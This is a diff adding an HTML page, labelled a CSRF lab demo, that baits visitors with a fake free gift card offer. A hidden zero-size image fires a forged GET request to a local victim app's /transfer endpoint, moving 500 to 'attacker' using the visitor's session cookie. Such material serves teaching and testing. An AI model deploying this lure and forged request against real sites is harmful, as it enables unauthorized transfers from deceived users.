@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>🎉 You Won a Free Prize!</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      min-height: 100vh;
+      display: flex; justify-content: center; align-items: center;
+      background: linear-gradient(135deg, #fbbf24, #f59e0b, #d97706);
+      color: #1e293b;
+    }
+    .card {
+      background: #fff;
+      padding: 48px;
+      border-radius: 16px;
+      box-shadow: 0 12px 40px rgba(0,0,0,0.15);
+      text-align: center;
+      max-width: 480px;
+    }
+    h1 { font-size: 2rem; margin-bottom: 12px; }
+    p  { font-size: 1.15rem; color: #475569; margin-bottom: 24px; }
+    .emoji { font-size: 4rem; margin-bottom: 16px; }
+    .btn {
+      display: inline-block; padding: 12px 32px;
+      background: #16a34a; color: #fff; border-radius: 8px;
+      text-decoration: none; font-size: 1.1rem; font-weight: 600;
+    }
+    .fine-print {
+      margin-top: 32px; font-size: .75rem; color: #94a3b8;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="card">
+    <div class="emoji">🎁🎉🏆</div>
+    <h1>Congratulations!</h1>
+    <p>You've been selected to win a <strong>FREE Gift Card</strong>!<br>
+       Click below to claim your reward.</p>
+    <a class="btn" href="#">Claim Your Prize</a>
+
+    <!-- =============================================================
+         CSRF ATTACK – GET-based exploit
+         The hidden <img> fires a GET request to the victim app's
+         /transfer endpoint.  Because the browser attaches the
+         victim's session cookie automatically, the transfer executes
+         as if alice initiated it.
+         ============================================================= -->
+    <img src="http://localhost:3000/transfer?to=attacker&amount=500"
+         width="0" height="0" style="display:none;"
+         alt="">
+
+    <p class="fine-print">
+      * This page is part of a CSRF lab demo. The hidden &lt;img&gt;
+      tag above silently triggers a GET /transfer request to the
+      victim app while you view this page.
+    </p>
+  </div>
+
+</body>
+</html>
